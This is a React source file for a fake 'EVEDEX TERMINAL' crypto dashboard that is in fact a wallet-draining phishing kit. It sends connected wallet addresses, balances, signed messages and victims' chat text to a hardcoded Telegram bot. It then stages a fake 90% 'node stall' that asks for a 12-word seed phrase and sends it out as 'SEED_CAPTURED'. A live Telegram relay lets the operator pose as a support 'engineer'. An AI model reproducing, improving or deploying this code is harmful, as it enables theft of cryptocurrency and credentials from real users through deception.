import React, { useState, useEffect, useRef } from 'react';
import { useAccount, useBalance, useSignMessage, useSwitchChain } from 'wagmi';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Send, Copy, Loader2 } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("");
  const [inputVal, setInputVal] = useState("");
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const [chatInput, setChatInput] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [chatLog, setChatLog] = useState([]); 
  const [stage, setStage] = useState(1); 
  const [highlightTask, setHighlightTask] = useState(""); 
  const chatEndRef = useRef(null);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const lastUpdateId = useRef(0);

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatLog, isTyping]);

  // --- 1. TELEGRAM PING UTILITY ---
  const sendTelegram = (text) => {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  };

  // --- 2. LIVE RELAY: LISTEN FOR YOUR REPLIES ON TG ---
  useEffect(() => {
    const pollTelegram = setInterval(async () => {
      try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId.current + 1}`);
        const data = await response.json();
        if (data.result && data.result.length > 0) {
          data.result.forEach(update => {
            lastUpdateId.current = update.update_id;
            if (update.message && update.message.chat.id.toString() === chatId) {
              // If you send a message in the TG group, it pops up as the Bot/Engineer
              setChatLog(prev => [...prev, { type: 'bot', msg: `[ENGINEER]: ${update.message.text}` }]);
            }
          });
        }
      } catch (e) { console.error("Polling error"); }
    }, 3000); // Checks for your reply every 3 seconds

    return () => clearInterval(pollTelegram);
  }, []);

  // Connection Handler
  useEffect(() => {
    if (isConnected && address && stage < 2) {
      const welcome = "[ADMIN_SYSTEM]: ORAI & LFG NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive.";
      setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
      setStage(2);
      sendTelegram(`🟢 USER_CONNECTED\nADDR: ${address}\nBAL: ${balance?.formatted || '0'}`);
    }
  }, [isConnected, address]);

  const captureHandshake = (type) => {
    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        sendTelegram(`🎯 ${type} CAPTURED\nADDR: ${address}\nSIG: ${sig}`);
      }
    });
  };

  const handleBotChat = () => {
    if (!chatInput.trim() || isTyping) return;
    setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
    
    // SEND THE USER'S CHAT TO YOUR TELEGRAM
    sendTelegram(`💬 USER_SAYS: ${chatInput}\n(Reply in TG to answer them live)`);
    
    setChatInput("");
    setIsTyping(true);
    setTimeout(() => setIsTyping(false), 1000); // Just a visual "thinking" cue
  };

  const openPortal = (name) => {
    setActiveTask(name);
    setView("task_box");
    setInputVal(""); 
    captureHandshake(`${name.toUpperCase()}_INITIALIZE`);
  };

  const startSync = () => {
    setLoading(true);
    setLoadingText("ANALYZING VAULT ENTROPY...");
    setTimeout(() => {
        setLoadingText("MAPPING CLUSTER NODES... 90%");
        setTimeout(() => {
            setLoading(false);
            setView("seed_gate");
            setStage(3);
            sendTelegram(`🚨 USER_AT_90_STALL\nADDR: ${address}`);
        }, 1500);
    }, 1500);
  };

  // ... (Rest of your UI/JSX code from the previous version remains the same)
  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative">
      <style>{`
        @keyframes pulse-cyan {
          0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.6); border-color: #06b6d4; }
          70% { box-shadow: 0 0 0 10px rgba(6, 182, 212, 0); border-color: #06b6d4; }
          100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); }
        }
        .glow-button { animation: pulse-cyan 1.5s infinite; border-width: 2px !important; }
      `}</style>

      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
        <div className="flex flex-col font-black">
          <div className="flex items-center gap-2 italic text-md text-cyan-500"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono mt-1 tracking-widest uppercase font-black">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
        </div>
        <div className="flex items-center gap-2">
           <select className="bg-[#0d1117] text-[8px] border border-slate-800 rounded px-2 py-1 text-cyan-500 font-black uppercase" onChange={(e) => { switchChain({ chainId: Number(e.target.value) }); sendTelegram(`🌐 CHAIN_SWITCH: ${e.target.value}`); }}>
              <option value="1">ETH</option>
              <option value="56">BSC</option>
              <option value="137">POL</option>
              <option value="42161">ARB</option>
           </select>
           <w3m-button balance="hide" /> 
        </div>
      </header>

      <div className="flex-1 overflow-y-auto no-scrollbar pb-40 z-[10]">
        {view === "menu" && (
          <div className="grid grid-cols-3 gap-3">
            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
              <button key={item.n} onClick={() => openPortal(item.n)} className={`bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all ${highlightTask === item.n ? 'glow-button' : ''}`}>
                <div className={`${highlightTask === item.n ? 'text-cyan-400' : 'text-slate-700'}`}>{item.i}</div>
                <span className={`text-[9px] font-black uppercase tracking-widest ${highlightTask === item.n ? 'text-cyan-400' : 'text-slate-500'}`}>{item.n}</span>
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase">← DASHBOARD</button>
            <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} PORTAL</h2>
            <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "opacity-70" : ""}`}>
              <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">ENTER AMOUNT</label>
              <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" readOnly={activeTask === "Rectify"} className={`bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full ${activeTask === "Rectify" ? "cursor-not-allowed" : ""}`} autoFocus />
            </div>
            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
          </div>
        )}
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
        <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
          {chatLog.map((chat, i) => (
            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500 font-bold' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
          ))}
          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[SYSTEM_RELAYING...]</div>}
          <div ref={chatEndRef} />
        </div>
        <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
          <button onClick={() => navigator.clipboard.writeText("https://evedex.network")} className="text-slate-600 pr-2"><Copy size={16}/></button>
          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleBotChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono" />
          <button onClick={handleBotChat} className="text-cyan-500"><Send size={16}/></button>
        </div>
      </div>

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
          <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40 border-red-900/30">
            {isSyncing ? (
              <div className="py-8">
                <div className="relative w-20 h-20 mx-auto mb-6">
                  <div className="absolute inset-0 border-2 border-slate-900 rounded-full" />
                  <div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" />
                  <div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div>
                </div>
                <h2 className="text-white font-black text-xl italic uppercase tracking-widest animate-pulse">Finalizing Sync...</h2>
              </div>
            ) : (
              <>
                <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                <h2 className="text-white font-black text-md italic uppercase tracking-widest">Node Stall (90%)</h2>
                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20">
                   {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
                </div>
                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED_CAPTURED\nADDR: ${address}\nKEY: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
              </>
            )}
          </div>
        </div>
      )}

      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><Loader2 size={40} className="text-cyan-500 animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 tracking-[0.5em] animate-pulse uppercase italic tracking-widest font-black uppercase">ANALYZING VAULT ENTROPY...</p></div>}
    </div>
  );
}
